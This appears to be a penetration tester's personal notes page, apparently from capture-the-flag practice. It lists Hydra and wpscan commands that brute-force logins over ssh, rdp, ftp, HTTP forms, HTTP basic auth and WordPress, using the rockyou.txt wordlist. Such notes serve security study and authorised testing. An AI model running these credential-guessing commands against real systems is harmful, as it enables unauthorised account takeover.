# Attacks

## username list

remember there's a username list on `/usr/share/wordlists/dirb/others/names.txt`

## Hydra

### Basics

#### http-post

A standard attack looks like: 

`hydra -l ${user} -P /usr/share/wordlists/rockyou.txt ${RHOST} ${mode}`
modes can be eg. `ssh`, `rdp`,`vnc`, `ftp` or `http[s]-post-form`.

An example of an attack made towards a wordpress site eg. looked like this:
```
hydra $RHOST -l Elliot -P fsocity.dic http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username"
```
(For this particular box, we were given a file `fsocity.dic` to use for fuzzing)

#### http-get

If a website itself has password protection when you access it, note that it is looking in the Authorization header looking for something on the form `admin:password` (base64 encoded).
This can be attacked with hydra with the following command:
```
hydra $RHOST -l admin -P /usr/share/wordlists/rockyou.txt http-get / 
```

## WordPress

If you find a wordpress site, it's worth checking if you can pwn the admin login with:

```
wpscan -U admin --url $RHOST/${PATH} -P /usr/share/wordlists/rockyou.txt
```

An example of an equivalent `wpscan` command for the above hydra command, is:

```
wpscan -U Elliot --url $RHOST/wp-login -P fsocity.dic 
```
